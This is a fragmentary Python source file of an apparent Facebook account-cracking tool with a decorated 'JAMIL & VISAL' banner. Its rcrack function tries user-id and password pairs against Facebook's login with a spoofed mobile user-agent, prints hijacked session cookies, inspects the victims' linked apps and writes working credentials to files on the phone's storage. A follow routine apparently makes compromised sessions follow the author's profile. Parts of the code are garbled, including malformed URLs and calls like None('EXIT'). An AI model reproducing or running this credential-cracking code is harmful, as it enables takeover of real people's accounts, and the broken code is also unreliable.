...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW MY FACEBOOK ID🖤❤💚')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        ('https://www.facebook.com/profile.php?id=100078856130872')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    jalan(' \x1b[1;32m[4] \x1b[1;32mSubscribe My YOUTOBE❤️‍🩹')
...
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com .com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    ...
    w=session.get("'https://www.free.facebook.com/ /login/device-based/regular/login/'",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100078856130872', {
...
ha = current.day
today = date.today()
logo =                                          f"""{H}                                                                    _____ _   _ _____ _____  ______ _____  

     _        _        _        _        _    
   _( )__   _( )__   _( )__   _( )__   _( )__ 
 _|     _|_|     _|_|     _|_|     _|_|     _|
(_ J _ (_(_ A _ (_(_ M _ (_(_ I _ (_(_ L _ (_ 
  |_( )__| |_( )__| |_( )__| |_( )__| |_( )__|
     _        _        _        _        _    
   _( )__   _( )__   _( )__   _( )__   _( )__ 
 _|     _|_|     _|_|     _|_|     _|_|     _|
(_ A _ (_(_ H _ (_(_ M _ (_(_ A _ (_(_ D _ (_ 
  |_( )__| |_( )__| |_( )__| |_( )__| |_( )__|
                                                                    
     ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ 
    \033[1;32m
[◇]-------------------------------------------------------
 [◇] DEVELOPER  : JAMIL&ViSALking
 [◇] GITHUB     : JAMiL  KHAN ViSAL
 [◇] FACEBOOK   : JAMil AHMAD KiNG
 [◇] STATUS     : Free
 [◇] VIRSION    : 3.5
 [◇]  TEAM      :   JAMiL& ViSAL
 [◇]------------------------------------------------------
\033[1;37mFACE BOOK iD linkhttps://www.facebook.com/profile.php?id=100078856130872  (HACKIN TECH{ M }\033[1;37m 
\033[1;92m==========================================================
\033[33;44m  NAME       JAMIL & VISAL 🖤❤💚\033[0;m
\033[1;92m=========================================================="""      
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-N960N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(Visal➟✔OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ViSAL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(VISAL-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ViSAL-CP.txt', 'a').write(uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ViSAL🖤💚❤] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
